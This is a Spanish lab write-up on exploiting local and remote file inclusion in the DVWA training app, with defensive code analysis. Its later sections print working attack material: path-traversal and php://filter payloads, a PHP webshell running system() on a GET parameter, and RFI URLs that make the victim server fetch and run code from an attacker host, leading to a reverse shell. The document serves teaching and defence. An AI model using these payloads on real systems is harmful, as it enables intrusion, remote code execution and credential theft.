# File Inclusion en DVWA

## Índice

1. [¿Qué es File Inclusion?](#1-qué-es-file-inclusion)
   - [Local File Inclusion (LFI)](#11-local-file-inclusion-lfi)
   - [Directory Traversal / Path Traversal](#12-directory-traversal--path-traversal)
   - [Remote File Inclusion (RFI)](#13-remote-file-inclusion-rfi)
2. [Local File Inclusion en acción](#2-local-file-inclusion-en-acción)
   - [Nivel low — reconocimiento inicial](#21-nivel-low--reconocimiento-inicial)
   - [Directory Traversal para acceder a fi.php](#22-directory-traversal-para-acceder-a-fiphp)
   - [Análisis del código fuente — nivel low](#23-análisis-del-código-fuente--nivel-low)
   - [PHP Wrappers: leer el código fuente sin ejecutarlo](#24-php-wrappers-leer-el-código-fuente-sin-ejecutarlo)
   - [Nivel medium — bypass del filtro](#25-nivel-medium--bypass-del-filtro)
   - [Análisis del código fuente — nivel medium](#26-análisis-del-código-fuente--nivel-medium)
   - [Nivel high — bypass del comodín](#27-nivel-high--bypass-del-comodín)
   - [Análisis del código fuente — nivel high](#28-análisis-del-código-fuente--nivel-high)
3. [Prevención LFI — nivel impossible](#3-prevención-lfi--nivel-impossible)
   - [Análisis del código fuente — nivel impossible](#31-análisis-del-código-fuente--nivel-impossible)
4. [Remote File Inclusion en acción](#4-remote-file-inclusion-en-acción)
   - [Nivel low](#41-nivel-low)
   - [Nivel medium — bypass del filtro](#42-nivel-medium--bypass-del-filtro)
   - [RFI para Remote Code Execution (RCE)](#43-rfi-para-remote-code-execution-rce)
   - [Web Shell Reverse](#44-web-shell-reverse)
   - [Nivel high](#45-nivel-high)
5. [Prevención RFI](#5-prevención-rfi)
6. [Propuesta de ejercicio](#6-propuesta-de-ejercicio)

---

## 1. ¿Qué es File Inclusion?

Las vulnerabilidades de **File Inclusion** aparecen cuando una aplicación web permite que el valor de un parámetro controlado por el usuario sea utilizado directamente para incluir un fichero mediante funciones como `include()`, `require()` o similares, sin validar ni filtrar adecuadamente la entrada.

Algunas aplicaciones permiten acceder a ficheros del sistema (imágenes, logs, texto...) a través de parámetros en la URL. Tomando como ejemplo la siguiente URL:

```bash
https://example.com/viewlog.php?logfile=access.log
```

La página `viewlog.php` tiene el siguiente código:

```php
<?php
$logfile = $_GET['logfile'];
include($logfile);
?>
```

El problema reside en que la aplicación no hace ninguna comprobación del valor del parámetro `logfile`, fiándose de lo introducido por el usuario. Un usuario malintencionado puede manipularlo y solicitar la visualización de ficheros no previstos por la aplicación, por ejemplo accediendo a `auth.log` con:

```bash
https://example.com/viewlog.php?logfile=auth.log
```

---

### 1.1 Local File Inclusion (LFI)

**Local File Inclusion** (LFI) es una vulnerabilidad que ocurre cuando un atacante puede manipular campos de entrada o parámetros para incluir y ejecutar archivos almacenados **localmente en el servidor**. Las consecuencias pueden ser graves: acceso a información confidencial, ejecución de código arbitrario y compromiso total de la aplicación web y del servidor.

> **Nota:** Aunque el atacante ejecuta los ficheros incluidos con los privilegios del proceso del servidor web (habitualmente `www-data`), esto es suficiente para leer ficheros sensibles como `/etc/passwd`, logs de autenticación, ficheros de configuración con credenciales, etc.

![DVWA File Inclusion](./imagenes/file%20inclusion/01.png)

---

### 1.2 Directory Traversal / Path Traversal

**Directory Traversal** o **Path Traversal** es una vulnerabilidad que permite a un atacante, manipulando la URL de la aplicación, acceder a archivos o directorios almacenados **fuera del directorio raíz de la aplicación**.

Para ello se usa la secuencia `../` que indica subir un nivel en la estructura de directorios. Continuando con el ejemplo anterior, la siguiente petición permitiría acceder al contenido de `/etc/passwd`:

```bash
https://example.com/viewlog.php?logfile=../../../../etc/passwd
```

| Sistema | Secuencia de traversal |
|---------|----------------------|
| Linux / Unix | `../` |
| Windows | `../` o `..\` |

---

### 1.3 Remote File Inclusion (RFI)

**Remote File Inclusion** (RFI) es una vulnerabilidad que permite incluir y ejecutar archivos dentro de una aplicación web vulnerable desde un servidor externo. A diferencia de LFI, el atacante inyecta una URL externa en la función `include()`, lo que provoca que la aplicación vaya a buscar el código a un servidor remoto controlado por el atacante y lo ejecute.

Se trata de una vulnerabilidad **más peligrosa que LFI** porque permite al atacante la ejecución remota de comandos (RCE) en el servidor de la aplicación web.

```
Atacante                  Servidor DVWA (192.168.100.4)          Servidor atacante (192.168.100.250)
   |                              |                                      |
   |-- GET ?page=http://192.168.100.250/codigo.php -->                      |
   |                              |-- GET /codigo.php ----------------->|
   |                              |<-- código PHP de codigo.php --------|
   |                              |   include() ejecuta el código         |
   |<-- respuesta con output ---  |                                      |
```

> **Importante:** Para que RFI sea posible, las directivas `allow_url_fopen` y `allow_url_include` deben estar habilitadas en la configuración de PHP. Puede verificarse accediendo a `http://192.168.100.4/dvwa/phpinfo.php`.

---

## 2. Local File Inclusion en acción

**Objetivo:** leer las 5 citas que hay en el documento `fi.php` situado en el directorio `hackable/flags` de DVWA aprovechándose exclusivamente de las vulnerabilidades de inclusión de archivo.

---

### 2.1 Nivel low — reconocimiento inicial

Configurar el nivel de seguridad en DVWA a `Low` y acceder a la sección `File Inclusion`, donde aparecen tres enlaces a ficheros: `file1.php`, `file2.php` y `file3.php`.

Al hacer clic en los enlaces se accede al contenido de los ficheros. Revisando la URL se observa que el nombre del fichero a mostrar aparece en el parámetro `?page`:

```bash
http://192.168.100.4/dvwa/vulnerabilities/fi/?page=file1.php
```

![file1.php](./imagenes/file%20inclusion/02.png)

![file2.php](./imagenes/file%20inclusion/03.png)

![file3.php](./imagenes/file%20inclusion/04.png)

La forma más directa de comprobar si existe una vulnerabilidad LFI es intentar acceder a un archivo del sistema introduciendo su path directamente en el parámetro. En Linux, un buen candidato es `/etc/passwd`:

```bash
http://192.168.100.4/dvwa/vulnerabilities/fi/?page=/etc/passwd
```

![etc-passwd](./imagenes/file%20inclusion/05.png)

Si la aplicación muestra el contenido del fichero, la vulnerabilidad LFI queda confirmada. Accediendo al código fuente de la página devuelta se puede ver claramente el contenido completo del fichero:

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
regal:x:1000:1000:admin:/home/regal:/bin/bash
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
```

> **Nota:** El fichero `/etc/passwd` expone todos los usuarios del sistema, sus IDs, directorios home y shells. No contiene contraseñas (almacenadas en `/etc/shadow`), pero es útil para la fase de reconocimiento al revelar usuarios existentes en el sistema.

---

### 2.2 Directory Traversal para acceder a fi.php

Para acceder al fichero objetivo `fi.php`, se prueban distintos paths. El primer intento con un path relativo genera un mensaje de error que revela la ruta del directorio de la aplicación:

```bash
http://192.168.100.4/dvwa/vulnerabilities/fi/?page=hackable/flags/fi.php
```

![fi.php](./imagenes/file%20inclusion/06.png)

El error indica que la aplicación busca el fichero en `/var/www/html/dvwa/vulnerabilities/fi/`, lo que permite calcular cuántos niveles hay que subir para llegar a `hackable/flags/fi.php`. Se prueban sucesivamente:

![hackable/flags/fi.php](./imagenes/file%20inclusion/06.png)

```bash
http://192.168.100.4/dvwa/vulnerabilities/fi/?page=../hackable/flags/fi.php
```

![../hackable/flags/fi.php](./imagenes/file%20inclusion/07.png)


```bash
http://192.168.100.4/dvwa/vulnerabilities/fi/?page=../../hackable/flags/fi.php
```

![../../hackable/flags/fi.php](./imagenes/file%20inclusion/08.png)


La segunda URL funciona y muestra parte del contenido de `fi.php`:

```bash
1.) Bond. James Bond
2.) My name is Sherlock Holmes. It is my business to know what other people don't know.
--LINE HIDDEN ;)--
4.) The pool on the roof must have a leak.
```

> **Nota:** Solo aparecen tres de las cinco citas porque el fichero contiene código PHP que se ejecuta al ser incluido. La cita 3 está ocultada en el código y la cita 5 está en un comentario HTML. Para ver el contenido completo sin que se ejecute el código PHP es necesario usar **PHP Wrappers**.

---

### 2.3 Análisis del código fuente — nivel low

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?>

if( isset( $file ) )
        include( $file );
else {
        header( 'Location:?page=include.php' );
        exit;
}
```

El programador recoge directamente el valor del parámetro `page` sin realizar ninguna validación ni filtrado, y lo pasa a la función `include()`. Cualquier path válido accesible por el proceso `www-data` puede ser incluido y ejecutado.

---

### 2.4 PHP Wrappers: leer el código fuente sin ejecutarlo

Cuando un fichero PHP es incluido mediante `include()`, su código se ejecuta y solo se ve la salida. Para leer el **código fuente completo** sin que se ejecute, se puede abusar de los **PHP Wrappers**, que son esquemas de acceso integrados en PHP para interactuar con el sistema de archivos de formas especiales.

En la URL `http://192.168.100.4/dvwa/phpinfo.php` se puede verificar que el wrapper `filter` está disponible revisando la sección *Registered PHP Streams* (que incluye `php`) y la sección *Input Validation and Filtering* (habilitada).

El wrapper `php://filter` con el filtro `convert.base64-encode` permite obtener el contenido del fichero codificado en Base64, evitando su ejecución:

```bash
http://192.168.100.4/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../hackable/flags/fi.php
```

La respuesta es una cadena Base64 que puede decodificarse con **CyberChef** o desde la línea de comandos:

```bash
┌──(kali㉿kali)-[~]
└─$ echo "PD9waHAKCmlmKCAhZGVmaW5lZCggJ0RWV0Ff..." | base64 -d
```

El resultado revela el código fuente completo de `fi.php` con las 5 citas:

![base64.php](./imagenes/file%20inclusion/09.png)

```php
<?php

if( !defined( 'DVWA_WEB_PAGE_TO_ROOT' ) ) {
    exit ("Nice try ;-). Use the file include next time!");
}

?>

1.) Bond. James Bond

<?php

echo "2.) My name is Sherlock Holmes. It is my business to know what other people don't know.\n\n<br /><br />\n";

$line3 = "3.) Romeo, Romeo! Wherefore art thou Romeo?";
$line3 = "--LINE HIDDEN ;)--";
echo $line3 . "\n\n<br /><br />\n";

$line4 = "NC4pI" . "FRoZSBwb29s" . "IG9uIH" . "RoZSByb29mIG1" . "1c3QgaGF" . "2ZSBh" . "IGxlY" . "Wsu";
echo base64_decode( $line4 );

?>

<!-- 5.) The world isn't run by weapons anymore, or energy, or money. It's run by little ones and zeroes, little bits of data. It's all just electrons. -->
```

> **Nota:** `php://filter` es solo uno de los muchos wrappers disponibles en PHP. Otros wrappers útiles en contextos de auditoría son `php://input` (para enviar código PHP en el cuerpo de la petición), `data://` (para incluir datos inline) o `expect://` (si está habilitado, permite ejecutar comandos del sistema). La disponibilidad de cada uno depende de la configuración de PHP.

---

### 2.5 Nivel medium — bypass del filtro

En el nivel `medium`, el programador aplica filtros en la entrada para tratar de impedir LFI. La URL utilizada en el nivel `low` ya no funciona:

```bash
http://192.168.100.4/dvwa/vulnerabilities/fi/?page=../../hackable/flags/fi.php
```

Los mensajes de error revelan que el filtro está eliminando la secuencia `../`, ya que en el warning se hace referencia a `hackable/flags/fi.php` en lugar de `../../hackable/flags/fi.php`. Sin embargo, el filtro no es recursivo: elimina `../` una sola vez sin comprobar si el resultado contiene nuevas instancias de la secuencia.

Técnicas para bypassear el filtro:

| Técnica | Transformación | Resultado tras el filtro |
|---------|---------------|--------------------------|
| Path absoluto | `/etc/passwd` | Funciona directamente |
| Más niveles `../` | `../../../` | Puede funcionar si el filtro no los elimina todos |
| URL encode | `../` → `%2E%2E%2F` | `../` |
| Doble URL encode | `../` → `%252E%252E%252F` | `%2E%2E%2F` |
| **Traversal no recursivo** | `....//` | `../` ✓ |

La técnica del traversal no recursivo (`....//`) funciona con esta aplicación:

```bash
http://192.168.100.4/dvwa/vulnerabilities/fi/?page=....//....//hackable/flags/fi.php
```

Al pasar `....//....//hackable/flags/fi.php` por el filtro, este elimina `../` de cada `....//`, dejando como resultado `../../hackable/flags/fi.php`, que es un path válido al fichero.

> **Nota:** El path absoluto también funciona en este nivel: `http://192.168.100.4/dvwa/vulnerabilities/fi/?page=/etc/passwd` sigue siendo accesible porque el filtro solo elimina `../` y `http://`/`https://`, pero no restringe paths absolutos.

---

### 2.6 Análisis del código fuente — nivel medium

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\\" ), "", $file );

?>
```

El filtro usa `str_replace()` para eliminar `../` y `..\`, pero esta operación no es recursiva. Al pasar `....//`, el resultado tras el filtrado es `../`, que es exactamente lo que el filtro pretendía eliminar. El mismo principio aplica para `....\\` en Windows.

![medium](./imagenes/file%20inclusion/10.png)

> **Advertencia:** El filtrado con `str_replace()` es inherentemente frágil para la seguridad. No contempla variantes como URL encoding, doble encoding ni las construcciones no recursivas. La solución robusta no es añadir más entradas a la lista negra, sino validar la entrada con una lista blanca de valores permitidos.

---

### 2.7 Nivel high — bypass del comodín

En el nivel `high`, el programador perfecciona el filtro restringiendo los ficheros que pueden incluirse: solo permite ficheros cuyo nombre empiece por `file` o sea exactamente `include.php`. Para no tener que listar todos los ficheros individualmente, usa el comodín `*` con `fnmatch()`.

Se conoce la existencia de `file1.php`, `file2.php` y `file3.php`, por lo que se prueban otras combinaciones para entender el comportamiento del filtro:

| Valor del parámetro `page` | Comportamiento |
|---------------------------|----------------|
| `file4.php` | Existe, muestra su contenido. |
| `file5.php`, `file6.php` | No existen, pero la aplicación los busca (el nombre empieza por `file`). |
| `/etc/passwd` | Existe, pero la aplicación muestra `ERROR: File not found!` (no empieza por `file`). |
| `fileprueba.php` | No existe, pero la aplicación lo busca (empieza por `file`). |
| `pfile1.php` | Error programado: no empieza por `file`. |

La lógica del filtro queda clara: si el parámetro **empieza por `file`**, la aplicación lo procesa; si no, muestra el error. El bypass consiste en construir una URL donde el parámetro empiece por `file` seguido del path traversal al fichero objetivo:

```bash
http://192.168.100.4/dvwa/vulnerabilities/fi/?page=file/../../../hackable/flags/fi.php
```

Al añadir `file/` al principio, hay que añadir un nivel extra de `../` para compensar, ya que `file/` es interpretado como un directorio adicional en la ruta.

---

### 2.8 Análisis del código fuente — nivel high

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?>
```

La función `fnmatch("file*", $file)` comprueba si el valor del parámetro comienza por `file`. El error del desarrollador es que el comodín `*` permite cualquier carácter a continuación de `file`, incluyendo los separadores de directorio `/`, lo que hace posible el path traversal a partir del prefijo `file/`.

---

## 3. Prevención LFI — nivel impossible

El nivel `Impossible` abandona completamente el enfoque de lista negra y adopta una **lista blanca estricta**: solo se permiten exactamente cuatro valores para el parámetro `page`. Cualquier otro valor, sea un path de traversal, un wrapper o cualquier otra cadena, produce el error `ERROR: File not found!` sin llegar a ejecutar ningún `include()`.

---

### 3.1 Análisis del código fuente — nivel impossible

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Only allow include.php or file{1..3}.php
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?>
```

Las medidas recomendadas para prevenir vulnerabilidades de tipo File Inclusion son:

- **No confiar en las entradas del usuario** y validarlas siempre en el servidor.
- **Usar listas blancas** con los valores de fichero permitidos. Para nombres de archivo, la lista blanca debe ser estricta y limitar exactamente los valores autorizados.
- **Rechazar las entradas que no cumplan estrictamente las especificaciones**, en lugar de intentar limpiar las entradas no deseadas.
- **Excluir separadores de directorio** como `/` del conjunto de caracteres permitidos en el parámetro.
- **Deshabilitar funcionalidades no necesarias**, como `allow_url_fopen` y `allow_url_include` en PHP.
- **Limitar los wrappers PHP** disponibles, permitiendo únicamente los necesarios para el funcionamiento de la aplicación.

---

## 4. Remote File Inclusion en acción

Para explotar una vulnerabilidad RFI es requisito obligatorio que `allow_url_fopen` y `allow_url_include` estén habilitados en PHP. Puede confirmarse revisando `http://192.168.100.4/dvwa/phpinfo.php` en la sección *Core*:

| Directiva | Local Value | Master Value |
|-----------|-------------|--------------|
| `allow_url_fopen` | On | On |
| `allow_url_include` | On | On |

![PHP Core](./imagenes/file%20inclusion/11.png)

---

### 4.1 Nivel low

El primer paso para explotar una vulnerabilidad RFI es preparar un servidor web en la máquina atacante que alojará el código malicioso. Como código malicioso se crea un script `rfi.php` que, al ejecutarse, mostrará un mensaje y ejecutará los comandos del sistema `hostname` y `whoami`:

```bash
┌──(kali㉿kali)-[~]
└─$ cat rfi.php        
<?php
print "Remote Fila Inclusión OK";
print "<br>";
system("hostname;whoami");
?>

┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

Una vez preparado el código, se genera la siguiente petición HTTP para que la aplicación vulnerable lo solicite al servidor atacante y lo ejecute:

```bash
http://192.168.100.4/dvwa/vulnerabilities/fi/?page=http://192.168.100.250:8000/rfi.php
```

La aplicación vulnerable solicita `rfi.php` al servidor web corriendo en `192.168.100.250`, inyecta el código recibido en la función `include()` y lo ejecuta, mostrando en la respuesta `Game Over - Remote File Inclusion` junto con el hostname y el usuario del sistema (`www-data`).

![Ejecución remota de código](./imagenes/file%20inclusion/12.png)

> **Advertencia:** Una vulnerabilidad RFI proporciona directamente **Remote Code Execution (RCE)** en el servidor víctima. El atacante tiene control total sobre el código que se ejecuta, lo que hace que esta vulnerabilidad sea significativamente más peligrosa que LFI, que está limitada a los ficheros ya presentes en el servidor.

---

### 4.2 Nivel medium — bypass del filtro

En el nivel `medium`, el filtro implementado elimina `http://` y `https://` de la entrada, haciendo que la petición anterior falle. Los mensajes de error revelan que el fichero buscado es `192.168.100.250/rfi.php` en lugar de `http://192.168.100.250/rfi.php`, confirmando que el filtro eliminó el esquema `http://`.

El código fuente del filtro es el mismo que el de LFI nivel medium:

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\\" ), "", $file );

?>
```

Para bypassear el filtro se puede aprovechar que `str_replace()` no es case-sensitive por defecto y que el borrado no es recursivo:

| Técnica | Valor enviado | Resultado tras el filtro |
|---------|--------------|--------------------------|
| Mayúsculas | `HTTP://192.168.100.250/rfi.php` | `HTTP://` no coincide con `http://`, pasa intacto |
| Recursivo | `httphttp://:// 192.168.100.250/rfi.php` | tras eliminar `http://` queda `http://192.168.100.250/...` |

Ambas soluciones funcionan:

```bash
http://192.168.100.4/dvwa/vulnerabilities/fi/?page=HTTP://192.168.100.250/rfi.php
```

![Ejecución remota de código nivel medio 1](./imagenes/file%20inclusion/13.png)


```bash
http://192.168.100.4/dvwa/vulnerabilities/fi/?page=httphttp://:// 192.168.100.250/rfi.php
```

![Ejecución remota de código nivel medio 2](./imagenes/file%20inclusion/14.png)

---

### 4.3 RFI para Remote Code Execution (RCE)

Una vulnerabilidad RFI permite al atacante conseguir ejecución remota de código (RCE) en el servidor víctima de forma directa. El siguiente script PHP ilustra cómo construir una **webshell** mínima que acepta comandos como parámetro GET:

```bash
┌──(kali㉿kali)-[~]
└─$ cat rce.php 
<?php
print "Command: ".htmlspecialchars($_GET['cmd']);
print "<br>";
system($_GET['cmd']);
?>

┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Mediante RFI se solicita el script malicioso junto con el parámetro `cmd` donde se indica el comando a ejecutar:

```bash
http://192.168.100.4/dvwa/vulnerabilities/fi/?page=HTTP://192.168.100.250:8000/rce.php&cmd=cat%20/etc/issue
```

```bash
http://192.168.100.4/dvwa/vulnerabilities/fi/?page=HTTP://192.168.100.250:8000/rce.php&cmd=cat%20/etc/passwd
```

La respuesta muestra directamente la salida del comando ejecutado en el servidor víctima.

![Remote Code Execution](./imagenes/file%20inclusion/15.png)

> **Advertencia:** Una webshell de este tipo proporciona al atacante una interfaz para ejecutar comandos arbitrarios en el servidor. A diferencia de una reverse shell, la webshell no requiere conectividad saliente desde el servidor, lo que la hace más difícil de detectar por firewalls que solo inspeccionan tráfico saliente. El siguiente paso habitual tras obtener RCE es establecer una reverse shell para disponer de una terminal interactiva más cómoda.

---

### 4.4 Web Shell Reverse

Una vez que se dispone de ejecución remota de código (RCE) como se vio en el punto anterior, el paso lógico para obtener un control interactivo y cómodo del servidor es establecer una **reverse shell** (conexión inversa).

Para generar el payload de conexión, una herramienta muy práctica es la web **Reverse Shell Generator** (revshells.com). En este caso, se ha generado el clásico script en PHP de **PentestMonkey**.

Los pasos que se realizan son los siguientes:

1. **Generar el payload**: En la web de *Reverse Shell Generator*, se introduce la IP de la máquina atacante (Kali Linux) y el puerto de escucha (por ejemplo, `4321`). Se selecciona la opción `PHP PentestMonkey` y se descarga o copia el código en un archivo llamado `wsh.php`.
2. **Alojar la reverse shell**: Al igual que en las pruebas anteriores, se sirve el archivo `wsh.php` desde la máquina atacante levantando un servidor web.

```bash
┌──(kali㉿kali)-[~]
└─$ ls wsh.php                 
wsh.php
                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
...
```

3. **Ponerse a la escucha**: En una nueva terminal de la máquina atacante, se utiliza Netcat para abrir el puerto configurado y esperar la conexión del servidor víctima.

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4321    
Listening on [0.0.0.0] (family 0, port 4321)
...
```

4. **Explotar el RFI**: Se inyecta la URL del script malicioso en la aplicación vulnerable para que lo procese y ejecute.

```bash
http://192.168.100.4/dvwa/vulnerabilities/fi/?page=HTTP://192.168.100.250:8000/wsh.php
```

5. **Obtener la sesión interactiva**: Al acceder a la URL, el servidor web víctima ejecuta el código PHP de PentestMonkey y se conecta de vuelta al puerto 4321 de Kali Linux. En la terminal de Netcat aparecerá el prompt, obteniendo así una shell completa como el usuario `www-data`.

![Web Shell Reverse](./imagenes/file%20inclusion/16.png)

---

### 4.5 Nivel high

En el nivel `high`, la validación implementada por el desarrollador (el filtro `fnmatch("file*", ...)`) impide aprovechar la vulnerabilidad RFI, ya que una URL externa como `HTTP://192.168.100.250/rfi.php` no empieza por `file`, por lo que la aplicación devuelve el error programado antes de llegar a ejecutar `include()`.

---

## 5. Prevención RFI

Las medidas de prevención para RFI son similares a las indicadas para LFI, haciendo especial énfasis en las siguientes:

- **Deshabilitar `allow_url_include`** en `php.ini`: es la medida más efectiva, ya que impide directamente que `include()` pueda cargar código desde URLs remotas, aunque `allow_url_fopen` permanezca habilitado para otras funciones de red.
- **Deshabilitar `allow_url_fopen`** si no es estrictamente necesario para el funcionamiento de la aplicación.
- **Usar listas blancas** de ficheros permitidos, rechazando cualquier valor que no coincida exactamente con los nombres esperados.
- **No confiar en las entradas del usuario**: validar y sanitizar cualquier parámetro que pueda influir en rutas de ficheros o URLs.
- **Analizar la aplicación y permitir únicamente los wrappers PHP necesarios** para su funcionamiento, desactivando el resto mediante la configuración de PHP.

> **Recuerda:** La diferencia fundamental entre LFI y RFI es que LFI requiere que el fichero malicioso ya esté presente en el servidor (por ejemplo, mediante una subida de ficheros previa o mediante *log poisoning*), mientras que RFI permite al atacante alojar el código en cualquier servidor externo que controle, sin necesidad de acceso previo al sistema víctima.

--

## 6. Propuesta de ejercicio

Tomando como punto de partida el final del apartado de *File Inclusion* y con el nivel de seguridad activado en *Medium*, se quiere obtener el contenido del archivo `config.inc.php` (`/var/www/html/dvwa/config/config.inc.php`) que contiene la información de la conexión a la base de datos.

Primero de todo lanzamos la siguiente URL para obtener el archivo codificado a base64.

```bash
http://192.168.100.4/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=....//....//config/config.inc.php
```

Con el resultado hacemos el proceso de decodificación para obtener el código fuente php.

```bash
┌──(kali㉿kali)-[~]
└─$ echo "PD9waHAKCiMgSWYgeW91IGFyZSBoYXZpbmcgcHJvYmxlbXMgY29ubmVjdGluZyB0byB0aGUgTXlTUUwgZGF0YWJhc2UgYW5kIGFsbCBvZiB0aGUgdmFyaWFibGVzIGJlbG93IGFyZSBjb3JyZWN0CiMgdHJ5IGNoYW5naW5nIHRoZSAnZGJfc2VydmVyJyB2YXJpYWJsZSBmcm9tIGxvY2FsaG9zdCB0byAxMjcuMC4wLjEuIEZpeGVzIGEgcHJvYmxlbSBkdWUgdG8gc29ja2V0cy4KIyAgIFRoYW5rcyB0byBAZGlnaW5pbmphIGZvciB0aGUgZml4LgoKIyBEYXRhYmFzZSBtYW5hZ2VtZW50IHN5c3RlbSB0byB1c2UKJERCTVMgPSBnZXRlbnYoJ0RCTVMnKSA/OiAnTXlTUUwnOwojJERCTVMgPSAnUEdTUUwnOyAvLyBDdXJyZW50bHkgZGlzYWJsZWQKCiMgRGF0YWJhc2UgdmFyaWFibGVzCiMgICBXQVJOSU5HOiBUaGUgZGF0YWJhc2Ugc3BlY2lmaWVkIHVuZGVyIGRiX2RhdGFiYXNlIFdJTEwgQkUgRU5USVJFTFkgREVMRVRFRCBkdXJpbmcgc2V0dXAuCiMgICBQbGVhc2UgdXNlIGEgZGF0YWJhc2UgZGVkaWNhdGVkIHRvIERWV0EuCiMKIyBJZiB5b3UgYXJlIHVzaW5nIE1hcmlhREIgdGhlbiB5b3UgY2Fubm90IHVzZSByb290LCB5b3UgbXVzdCB1c2UgY3JlYXRlIGEgZGVkaWNhdGVkIERWV0EgdXNlci4KIyAgIFNlZSBSRUFETUUubWQgZm9yIG1vcmUgaW5mb3JtYXRpb24gb24gdGhpcy4KJF9EVldBID0gYXJyYXkoKTsKJF9EVldBWyAnZGJfc2VydmVyJyBdICAgPSBnZXRlbnYoJ0RCX1NFUlZFUicpID86ICcxMjcuMC4wLjEnOwokX0RWV0FbICdkYl9kYXRhYmFzZScgXSA9IGdldGVudignREJfREFUQUJBU0UnKSA/OiAnZHZ3YSc7CiRfRFZXQVsgJ2RiX3VzZXInIF0gICAgID0gZ2V0ZW52KCdEQl9VU0VSJykgPzogJ2R2d2EnOwokX0RWV0FbICdkYl9wYXNzd29yZCcgXSA9IGdldGVudignREJfUEFTU1dPUkQnKSA/OiAncEBzc3cwcmQnOwokX0RWV0FbICdkYl9wb3J0J10gICAgICA9IGdldGVudignREJfUE9SVCcpID86ICczMzA2JzsKCiMgUmVDQVBUQ0hBIHNldHRpbmdzCiMgICBVc2VkIGZvciB0aGUgJ0luc2VjdXJlIENBUFRDSEEnIG1vZHVsZQojICAgWW91J2xsIG5lZWQgdG8gZ2VuZXJhdGUgeW91ciBvd24ga2V5cyBhdDogaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9yZWNhcHRjaGEvYWRtaW4KJF9EVldBWyAncmVjYXB0Y2hhX3B1YmxpY19rZXknIF0gID0gZ2V0ZW52KCdSRUNBUFRDSEFfUFVCTElDX0tFWScpID86ICcnOwokX0RWV0FbICdyZWNhcHRjaGFfcHJpdmF0ZV9rZXknIF0gPSBnZXRlbnYoJ1JFQ0FQVENIQV9QUklWQVRFX0tFWScpID86ICcnOwoKIyBEZWZhdWx0IHNlY3VyaXR5IGxldmVsCiMgICBEZWZhdWx0IHZhbHVlIGZvciB0aGUgc2VjdXJpdHkgbGV2ZWwgd2l0aCBlYWNoIHNlc3Npb24uCiMgICBUaGUgZGVmYXVsdCBpcyAnaW1wb3NzaWJsZScuIFlvdSBtYXkgd2lzaCB0byBzZXQgdGhpcyB0byBlaXRoZXIgJ2xvdycsICdtZWRpdW0nLCAnaGlnaCcgb3IgaW1wb3NzaWJsZScuCiRfRFZXQVsgJ2RlZmF1bHRfc2VjdXJpdHlfbGV2ZWwnIF0gPSBnZXRlbnYoJ0RFRkFVTFRfU0VDVVJJVFlfTEVWRUwnKSA/OiAnaW1wb3NzaWJsZSc7CgojIERlZmF1bHQgbG9jYWxlCiMgICBEZWZhdWx0IGxvY2FsZSBmb3IgdGhlIGhlbHAgcGFnZSBzaG93biB3aXRoIGVhY2ggc2Vzc2lvbi4KIyAgIFRoZSBkZWZhdWx0IGlzICdlbicuIFlvdSBtYXkgd2lzaCB0byBzZXQgdGhpcyB0byBlaXRoZXIgJ2VuJyBvciAnemgnLgokX0RWV0FbICdkZWZhdWx0X2xvY2FsZScgXSA9IGdldGVudignREVGQVVMVF9MT0NBTEUnKSA/OiAnZW4nOwoKIyBEaXNhYmxlIGF1dGhlbnRpY2F0aW9uCiMgICBTb21lIHRvb2xzIGRvbid0IGxpa2Ugd29ya2luZyB3aXRoIGF1dGhlbnRpY2F0aW9uIGFuZCBwYXNzaW5nIGNvb2tpZXMgYXJvdW5kCiMgICBzbyB0aGlzIHNldHRpbmcgbGV0cyB5b3UgdHVybiBvZmYgYXV0aGVudGljYXRpb24uCiRfRFZXQVsgJ2Rpc2FibGVfYXV0aGVudGljYXRpb24nIF0gPSBnZXRlbnYoJ0RJU0FCTEVfQVVUSEVOVElDQVRJT04nKSA/OiBmYWxzZTsKCmRlZmluZSAoJ01ZU1FMJywgJ215c3FsJyk7CmRlZmluZSAoJ1NRTElURScsICdzcWxpdGUnKTsKCiMgU1FMaSBEQiBCYWNrZW5kCiMgICBVc2UgdGhpcyB0byBzd2l0Y2ggdGhlIGJhY2tlbmQgZGF0YWJhc2UgdXNlZCBpbiB0aGUgU1FMaSBhbmQgQmxpbmQgU1FMaSBsYWJzLgojICAgVGhpcyBkb2VzIG5vdCBhZmZlY3QgdGhlIGJhY2tlbmQgZm9yIGFueSBvdGhlciBzZXJ2aWNlcywganVzdCB0aGVzZSB0d28gbGFicy4KIyAgIElmIHlvdSBkbyBub3QgdW5kZXJzdGFuZCB3aGF0IHRoaXMgbWVhbnMsIGRvIG5vdCBjaGFuZ2UgaXQuCiRfRFZXQVsnU1FMSV9EQiddID0gZ2V0ZW52KCdTUUxJX0RCJykgPzogTVlTUUw7CiMkX0RWV0FbJ1NRTElfREInXSA9IFNRTElURTsKIyRfRFZXQVsnU1FMSVRFX0RCJ10gPSAnc3